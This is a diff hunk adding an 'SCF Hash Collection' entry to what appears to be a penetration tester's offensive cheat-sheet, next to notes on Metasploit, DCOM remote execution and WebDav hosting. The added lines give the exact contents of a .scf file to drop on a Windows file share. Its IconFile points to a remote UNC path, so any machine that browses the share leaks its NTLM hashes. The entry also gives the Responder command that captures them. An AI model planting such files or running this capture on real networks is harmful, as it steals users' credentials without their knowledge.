@@ -126,6 +126,15 @@ Metasploit Pro Exploits
       https://ired.team/offensive-security/lateral-movement/t1175-distributed-component-object-model
       Remote DCOM command execution using credentials
 
+SCF Hash Collection
+    Create a scf file extension with the following contents in a Windows File Share:
+        [Shell]
+        Command=2
+        IconFile=\\192.168.0.12\share\test.ico
+        [Taskbar]
+        Command=ToggleDesktop
+    Start responder: responder -wrf --lm -v -I eth0
+
 File Share
   WebDav (Host File over port 80)
     pip install wsgidav cheroot
